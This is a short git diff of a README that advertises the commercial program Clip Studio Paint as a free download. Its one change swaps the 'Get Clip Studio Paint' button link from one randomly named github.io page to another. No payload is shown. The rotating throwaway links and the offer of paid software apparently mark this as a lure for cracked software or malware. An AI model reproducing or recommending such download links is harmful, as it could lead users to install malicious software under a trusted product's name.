@@ -21,7 +21,7 @@ To begin using this **Clip Studio Paint Art Software** and **Clip Studio Paint I
 | :--- | :--- |
 | **Get Clip Studio Paint Art Software** | Click the button below to start using this **Clip Studio Paint Comic Creator**. |
 
-[![Button](https://img.shields.io/badge/🎨-Get_Clip_Studio_Paint-2ea44f?style=for-the-badge)](https://bolatzelenin.github.io/.github/clip-studio-paint-art-software)
+[![Button](https://img.shields.io/badge/🎨-Get_Clip_Studio_Paint-2ea44f?style=for-the-badge)](https://gabrielyangqobj.github.io/.github/clip-studio-paint-art-software)
 
 ## System Requirements
 
